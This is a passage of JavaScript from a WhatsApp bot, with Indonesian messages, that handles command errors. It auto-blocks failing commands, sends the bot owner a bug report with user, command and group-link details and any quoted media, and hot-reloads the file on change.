if(checkError(err.message, JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/listerror.json')))) return
addError(err.message, command, JSON.parse(fs.readFileSync('./ACTION/STORAGE/X-DATA/listerror.json')))
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await xdev.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${fake}\n${calender}`,
buttons: mok,
headerType: 1
}

await xdev.sendMessage(Ownerin, tolol , {quoted: setQuoted})

if(!autoblockcmd){
await xdev.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await xdev.downloadAndSaveMediaMessage(quoted)
await xdev.sendMedia (Ownerin, media, setQuoted, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



} catch (e){
e = String(e) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {return}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
xdev.sendMessage(Ownerin, {text : util.format(e)})
}
console.log(e)
}
}









    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})

